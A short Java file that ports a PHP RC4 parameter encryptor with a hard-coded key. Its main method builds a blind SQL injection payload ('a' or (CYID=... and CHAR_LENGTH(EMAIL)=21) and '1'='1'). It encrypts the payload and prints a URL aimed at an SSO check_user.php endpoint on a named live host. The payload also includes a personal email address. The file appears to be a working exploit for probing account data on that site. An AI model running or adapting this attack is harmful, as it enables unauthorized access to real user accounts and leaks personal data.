package com.cycrypt.http.query;

public class CYParamEncrypter {
	
	private static final String KEY="testkey";
	public static String encode(String source)
	{
		return rcEncrypt(source);
	}
	
	public static String byte2HexString(byte b) { 
		  String result="";

		       String hex = Integer.toHexString(b & 0xFF); 
		       if (hex.length() == 1) { 
		         hex = '0' + hex; 
		       } 
		       result=result+hex; 
		     return result;
		 }
	
//	function rc4encrypt($pwd, $data)
	public static String rcEncrypt(String data)
	 {
		StringBuffer result = new StringBuffer();
//		
		String pwd = new String(KEY);
//		 $key[] = ''; 
		char[] key=new char[256];
//		 $box[] = '';
		char[] box=new char[256];
//		 $cipher = '';
//		 $pwd_length = strlen($pwd);
		int pwdLength = KEY.length();
//		 $data_length = strlen($data);
		int dataLength = data.length();
//		 for ($i = 0; $i < 256; $i++)
		for(int i=0;i<256;i++)
		 {
//		 	$key[$i] = ord($pwd[$i % $pwd_length]); 
			key[i] = pwd.charAt(i%pwdLength);
//		 	$box[$i] = $i; 
			box[i]=(char)i;
		 }
//		 for ($j = $i = 0; $i < 256; $i++)
		for(int j=0, i=0;i<256;i++)
		 {
//		 	$j = ($j + $box[$i] + $key[$i]) % 256; 
			j=(j+box[i]+key[i])%256;
//		 	$tmp = $box[$i]; 
			char tmp = box[i];
//		 	$box[$i] = $box[$j];
			box[i] = box[j];
//		 	$box[$j] = $tmp; 
			box[j]=tmp;
		 }
//		 for ($a = $j = $i = 0; $i < $data_length; $i++)
		for(int a=0,i=0,j=0;i<dataLength;i++)
		 {
//		 	$a = ($a + 1) % 256; 
			a = (a+1)%256;
//		 	$j = ($j + $box[$a]) % 256; 
			j=(j+box[a])%256;
//		 	$tmp = $box[$a]; 
			char tmp = box[a];
//		 	$box[$a] = $box[$j]; 
			box[a] = box[j];
//		 	$box[$j] = $tmp; 
			box[j]=tmp;
//		 	$k = $box[(($box[$a] + $box[$j]) % 256)]; 
			int k = box[((box[a]+box[j])%256)];
//		 	$cipher .= chr(ord($data[$i]) ^ $k); 
			int c =((int)data.charAt(i)^k);
			result.append(byte2HexString((byte)c));
		 }
//		 return $cipher; 
		return result.toString();
//	 }
	 }
	
	
	public static void main(String[] ss)
	{
		String param = "user_pk=goldwins520@gmail.com&user_pw=a' or (CYID='2001729706' and CHAR_LENGTH(EMAIL) =" + 21
				+ ") and '1'='1";
		String preFix = "http://cyworld.ifensi.com/services/sso/check_user.php?param=";
		System.out.println(preFix+encode(param));
	}

}
